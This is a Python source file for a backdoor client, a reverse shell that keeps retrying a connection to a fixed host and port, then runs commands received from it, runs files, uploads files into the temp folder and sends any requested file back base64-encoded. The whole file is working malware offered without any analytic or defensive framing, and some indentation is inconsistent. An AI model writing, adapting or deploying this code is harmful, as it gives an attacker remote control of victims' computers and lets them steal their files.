import tempfile, base64, socket, json, sys, os

class BackdoorClient:
	def __init__(self, ip, port):
		while(1):
			try:
				self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.connection.connect((ip, port))
				break
			except:
				pass

	def send_data(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

        def recv_data(self):
		json_data = ""
		while(1):
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				pass

	def run_cmd(self, cmd):
		result = os.popen(" ".join(cmd)).read()
		self.send_data(result)


	def run_file(self, file):
		os.popen(file)
		self.send_data("\033[94m [+] \033[39mRunning file \'"+file+"\'\n")

	def change_directory(self, path):
		if path == "%temp%":
			os.chdir(tempfile.gettempdir())
			self.send_data("")
		else:
			os.chdir(path)
			self.send_data("")

	def write_file(self, name, content):
                with open(tempfile.gettempdir()+"/"+name,'wb') as file:
                        file.write(base64.b64decode(content))
                self.send_data("\033[94m [+] \033[39mUpload successful (file stored in temp)\n")

	def read_file(self, path):
		with open(path,"rb") as file:
			self.send_data(base64.b64encode(file.read()))

	def close_connection(self):
		self.connection.close()
		sys.exit(0)

	def handle_cmd(self, cmd):
			if cmd[0] == "exit":
				self.close_connection()
			elif cmd[0] == "cd" and len(cmd) > 1:
				try:
					self.change_directory(cmd[1])
				except:
					self.send_data("\033[91m [+] \033[39mError running command\n")
			elif cmd[0] == "download" and len(cmd) > 1:
				try:
					self.read_file(cmd[1])
				except:
					self.send_data("\033[91m [+] \033[39mError running command\n")
			elif cmd[0] == "upload" and len(cmd) > 2:
				try:
					self.write_file(cmd[1].split("/")[-1],cmd[2])
				except:
					self.send_data("\033[91m [+] \033[39mError running command\n")
			elif cmd[0] == "run" and len(cmd) > 1:
				try:
					self.run_file(cmd[1])
				except:
					self.send_data("\033[91m [+] \033[39mError running command\n")
			else:
				try:
					self.run_cmd(cmd)
				except:
					self.send_data("\033[91m [+] \033[39mError running command\n")

	def execute(self):
		while(1):
			command = self.recv_data()
			self.handle_cmd(command)

if __name__ == '__main__':
	backdoor = BackdoorClient("10.0.0.200", 4444)
	backdoor.execute()


